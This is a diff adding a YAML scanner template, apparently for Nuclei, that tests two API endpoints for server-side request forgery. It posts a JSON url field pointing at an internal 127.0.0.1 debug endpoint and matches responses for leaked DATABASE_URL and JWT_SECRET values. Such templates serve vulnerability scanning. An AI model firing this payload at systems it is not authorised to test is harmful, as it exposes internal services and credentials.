@@ -1,0 +1,21 @@
+id: ssrf-internal-reflected
+info:
+  name: Server-side request forgery (internal, reflected)
+  severity: high
+  description: A url/webhook parameter is fetched server-side and the response is reflected to the client, letting an attacker reach internal-only services. Here it retrieves an internal debug endpoint and leaks its environment (DATABASE_URL/JWT_SECRET).
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/coverage/check"
+      - "{{BaseURL}}/api/v1/account/webhook"
+    headers:
+      Content-Type: application/json
+    body: "{\"url\":\"http://127.0.0.1:8080/api/v1/debug\"}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "DATABASE_URL"
+          - "JWT_SECRET"
